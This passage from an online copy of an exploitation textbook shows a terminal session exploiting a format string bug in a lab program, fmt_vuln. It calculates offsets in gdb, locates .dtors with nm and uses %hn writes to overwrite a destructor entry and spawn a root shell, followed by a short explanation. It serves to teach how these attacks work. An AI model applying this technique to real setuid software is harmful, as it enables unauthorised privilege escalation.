107%;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) p 0xbfff - 8</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">$1 = 49143</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) p 0xf9ec - 0xbfff</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$2 = 14829</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><b>08049694 </b>d <u>&nbsp;</u>DTOR_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049690 d <u>&nbsp;</u>DTOR_LIST<u> </u></p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x96\x96\x04\x08\x94\x96\x04\ x08&quot;)%49143x%4\$hn%14829x%5\$hn</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">????%49143x%4$hn%14829x%5$hn</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">????</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 329pt;text-indent: 0pt;text-align: left;">b7fe75fc</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = -72 0xffffffb8 sh-3.2# whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">root sh-3.2#</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_586.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Even though the <span class="s31">.dtors </span>section isn’t properly terminated with a NULL address of <span class="s31">0x00000000</span>, the shellcode address is still considered to be a destructor function. When the program exits, the shellcode will be called, spawning a root shell.</p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part67.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part69.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
